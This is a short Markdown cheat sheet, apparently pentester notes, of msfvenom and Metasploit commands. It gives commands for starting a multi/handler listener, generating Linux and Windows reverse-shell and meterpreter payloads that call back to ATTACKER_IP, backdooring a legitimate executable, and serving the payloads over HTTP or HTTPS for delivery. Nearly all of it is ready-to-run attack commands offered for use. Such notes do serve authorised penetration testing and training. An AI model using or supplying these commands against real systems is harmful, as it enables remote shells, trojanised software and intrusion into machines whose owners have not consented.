# Msfvenom

```
msfvenom --list payloads
msfvenom --list encrypt
msfvenom --list encoders
```

```
.../x64/shell_reverse_tcp  --> Stageless
.../x64/shell/reverse_tcp  --> Staged
```

## Multi handler
```
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost ATTACKER_IP;set lport ATTACKER_PORT;exploit"
```
```
msfconsole
use exploit/multi/handler
set PAYLOAD PAYLOAD
set LHOST=ATTACKER_IP
set LPORT=ATTACKER_PORT
run
```

## Payloads
### Linux
```
msfvenom -p linux/x64/shell_reverse_tcp -f elf -o revshell.elf LHOST=ATTACKER_IP LPORT=ATTACKER_PORT
msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o revshell.elf LHOST=ATTACKER_IP LPORT=ATTACKER_PORT
msfvenom -p linux/x86/exec CMD="/bin/ls" -f elf
```

### Windows
```
msfvenom -p windows/x64/shell_reverse_tcp -f exe -o revshell.exe LHOST=ATTACKER_IP LPORT=ATTACKER_PORT
msfvenom -p windows/meterpreter/reverse_tcp -f exe -o revshell.exe LHOST=ATTACKER_IP LPORT=ATTACKER_PORT
msfvenom -p windows/x64/exec CMD='calc.exe' -f exe
msfvenom -x Normal.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=ATTACKER_PORT -f exe -o Backdoored.exe
```


## Payload transfer
### HTTP server
```
python -m http.server 8080
```

### HTTPS server
```
openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
sudo python -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
```
